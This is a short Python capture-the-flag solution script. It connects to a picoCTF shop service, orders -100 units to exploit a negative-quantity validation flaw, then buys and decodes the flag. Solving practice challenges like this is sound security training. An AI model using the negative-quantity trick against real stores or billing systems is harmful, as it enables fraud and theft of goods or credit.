import socket
import re

addr="mercury.picoctf.net"
port=3952
timeout=5
isBought=False

recieved_data=""
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((addr,port))
    while True:
        chunk=s.recv(4084)
        if not chunk:
            break
        print(chunk)
        recieved_data+=str(chunk)
        if "Choose an option" in recieved_data:
            if not isBought:
                s.sendall("0\n".encode())
            else:
                s.sendall("2\n".encode())
            recieved_data=""
            
        elif "How many do you want to buy?" in recieved_data:
            if not isBought:
                s.sendall("-100\n".encode())
                isBought=True
            else:
                s.sendall("1\n".encode())
            recieved_data=""
        if "Flag" in recieved_data:
            num=[re.findall(r"\d+",i) for i in recieved_data.split(" ")]
    
    res=""
    for i in num:
        if len(i) > 0:
            res+=chr(int(i[0]))
    print(res)